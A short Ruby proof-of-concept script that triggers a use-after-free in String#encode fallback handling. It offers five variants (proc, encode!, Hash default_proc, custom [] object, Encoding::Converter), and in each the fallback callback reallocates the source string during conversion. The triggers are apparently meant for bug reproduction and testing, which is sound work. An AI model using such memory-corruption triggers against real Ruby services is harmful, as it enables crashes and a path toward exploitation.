# Variants of the String#encode fallback UAF. Run one at a time via ARGV[0].
which = ARGV[0] || "proc"

case which
when "proc"
  # minimal: fallback proc reallocates the receiver
  s = "あ" * 4000
  s.encode("US-ASCII", fallback: proc { |c| s.replace("Z" * (16*1024*1024)); "?" })

when "bang"
  # encode! (in-place) variant
  s = "あ" * 4000
  s.encode!("US-ASCII", fallback: proc { |c| s.replace("Z" * (16*1024*1024)); "?" })

when "hash"
  # Hash fallback whose default_proc mutates the source
  s = "あ" * 4000
  h = Hash.new { |hash, key| s.replace("Z" * (16*1024*1024)); "?" }
  s.encode("US-ASCII", fallback: h)

when "aref"
  # arbitrary object responding to [] (aref_fallback)
  s = "あ" * 4000
  o = Object.new
  o.define_singleton_method(:[]) { |c| s.replace("Z" * (16*1024*1024)); "?" }
  s.encode("US-ASCII", fallback: o)

when "converter"
  # Encoding::Converter#convert path
  s = "あ" * 4000
  ec = Encoding::Converter.new("UTF-8", "US-ASCII", fallback: proc { |c| s.replace("Z"*(16*1024*1024)); "?" })
  ec.convert(s)
end
STDERR.puts "NO CRASH (#{which})"
